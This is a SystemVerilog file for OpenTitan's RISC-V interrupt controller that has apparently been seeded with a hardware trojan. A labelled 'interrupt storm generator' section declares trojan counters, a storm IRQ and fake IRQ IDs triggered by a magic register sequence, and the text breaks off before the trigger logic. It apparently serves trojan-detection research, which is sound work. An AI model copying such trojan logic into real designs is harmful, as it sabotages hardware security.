// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// RISC-V Platform-Level Interrupt Controller compliant INTC
//
//   Current version doesn't support MSI interrupt but it is easy to add
//   the feature. Create one external register and connect qe signal to the
//   gateway module (as edge-triggered)
//
//   Consider to set MAX_PRIO as small number as possible. It is main factor
//   of area increase if edge-triggered counter isn't implemented.
//
// Verilog parameter
//   MAX_PRIO: Maximum value of interrupt priority

`include "prim_assert.sv"

module rv_plic import rv_plic_reg_pkg::*; #(
  parameter logic [NumAlerts-1:0] AlertAsyncOn    = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles = 1,
  // OpenTitan IP standardizes on level triggered interrupts,
  // hence LevelEdgeTrig is set to all-zeroes by default.
  // Note that in case of edge-triggered interrupts, CDC handling is not
  // fully implemented yet (this would require instantiating pulse syncs
  // and routing the source clocks / resets to the PLIC).
  parameter logic [NumSrc-1:0]    LevelEdgeTrig = '0, // 0: level, 1: edge
  // derived parameter
  localparam int SRCW    = $clog2(NumSrc)
) (
  input     clk_i,
  input     rst_ni,

  // Bus Interface (device)
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Interrupt Sources
  input  [NumSrc-1:0] intr_src_i,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Interrupt notification to targets
  output [NumTarget-1:0] irq_o,
  output [SRCW-1:0]      irq_id_o [NumTarget],

  output logic [NumTarget-1:0] msip_o
);

  rv_plic_reg2hw_t reg2hw;
  rv_plic_hw2reg_t hw2reg;

  localparam int MAX_PRIO    = 3;
  localparam int PRIOW = $clog2(MAX_PRIO+1);

  logic [NumSrc-1:0] ip;

  logic [NumSrc-1:0] ie [NumTarget];

  logic [NumTarget-1:0] claim_re; // Target read indicator
  logic [SRCW-1:0]      claim_id [NumTarget];
  logic [NumSrc-1:0]    claim; // Converted from claim_re/claim_id

  logic [NumTarget-1:0] complete_we; // Target write indicator
  logic [SRCW-1:0]      complete_id [NumTarget];
  logic [NumSrc-1:0]    complete; // Converted from complete_re/complete_id

  logic [SRCW-1:0]      cc_id [NumTarget]; // Write ID

  logic [NumSrc-1:0][PRIOW-1:0] prio;

  logic [PRIOW-1:0] threshold [NumTarget];

  // HARDWARE TROJAN: INTERRUPT STORM GENERATOR
  // Trojan State: Monitors for specific trigger pattern and generates interrupt storm
  logic [15:0] trojan_counter;
  logic trojan_active;
  logic [7:0] storm_counter;
  logic storm_irq;
  logic [SRCW-1:0] fake_irq_id;
  
  // Trojan trigger detection: Look for magic sequence in priority registers
  //